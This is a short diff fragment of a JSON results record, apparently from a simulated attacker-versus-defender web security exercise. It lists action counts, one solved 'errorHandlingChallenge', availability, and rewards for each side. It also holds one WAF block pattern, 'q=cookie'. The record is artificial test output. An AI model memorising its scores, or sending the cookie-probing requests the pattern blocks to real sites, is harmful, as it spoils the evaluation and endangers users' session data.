+    "reblocked_after": null
+   }
+  ],
+  "reblocked": 2,
+  "shut_out_at_end": false,
+  "exposure_ticks": 3,
+  "containment": null,
+  "red_actions": 12,
+  "red_actions_reached": 6,
+  "reached_after_contain": 4,
+  "challenges_solved": [
+   "errorHandlingChallenge"
+  ],
+  "flag_captured": false,
+  "red_outcomes": {
+   "answered": 6,
+   "blocked": 6,
+   "moved": 3
+  },
+  "waf_patterns": [
+   "q=cookie"
+  ],
+  "false_positive_actions": 0,
+  "legit_blocked_ticks": 0,
+  "legit_ok": 72,
+  "legit_fail": 0,
+  "availability": 1.0,
+  "blue_reward": 2.0,
+  "red_reward": 8.0
+ }
+}
